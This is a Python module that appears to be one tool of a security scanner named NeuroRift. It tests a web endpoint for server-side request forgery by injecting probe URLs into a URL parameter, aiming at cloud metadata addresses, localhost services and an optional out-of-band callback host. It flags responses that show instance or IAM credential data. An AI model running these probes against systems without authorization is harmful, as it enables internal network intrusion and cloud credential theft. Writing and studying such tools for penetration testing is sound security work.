#!/usr/bin/env python3
"""NeuroRift tool: SSRF testing (internal network probing, OOB detection)."""

import requests
from tools import ToolResult

SCHEMA = {
    "type": "object",
    "required": ["target"],
    "properties": {
        "target": {"type": "string", "description": "URL endpoint that accepts a URL/callback parameter"},
        "param": {"type": "string", "description": "Parameter name for URL injection", "default": "url"},
        "oob_host": {"type": "string", "description": "OOB callback host (Burp Collaborator etc.)", "default": ""},
    }
}

INTERNAL_PROBES = [
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://169.254.169.254/computeMetadata/v1/",  # GCP metadata
    "http://localhost:80/",
    "http://127.0.0.1:22/",
    "http://[::1]/",
]


class SSRFTool:
    name = "ssrf"
    description = "Test for Server-Side Request Forgery via URL parameter injection"

    @staticmethod
    def schema(): return SCHEMA

    def run(self, target: str, param: str = "url", oob_host: str = "") -> ToolResult:
        findings = []
        probes = INTERNAL_PROBES.copy()
        if oob_host:
            probes.append(f"http://{oob_host}/ssrf-probe")

        for probe in probes:
            try:
                resp = requests.get(target, params={param: probe}, timeout=8, verify=False, allow_redirects=False)
                # Signs of SSRF: response contains internal metadata keywords or unexpected content
                indicators = ["ami-id", "instance-id", "computeMetadata", "iam/security-credentials", "SSH-2.0"]
                for indicator in indicators:
                    if indicator.lower() in resp.text.lower():
                        findings.append({
                            "type": "ssrf",
                            "severity": "CRITICAL",
                            "probe_url": probe,
                            "indicator": indicator,
                            "param": param,
                        })
                        break
            except requests.RequestException:
                continue

        return ToolResult(
            tool_name=self.name, target=target,
            success=True, findings=findings,
            raw_output=f"Probed {len(probes)} SSRF vectors via param '{param}'"
        )
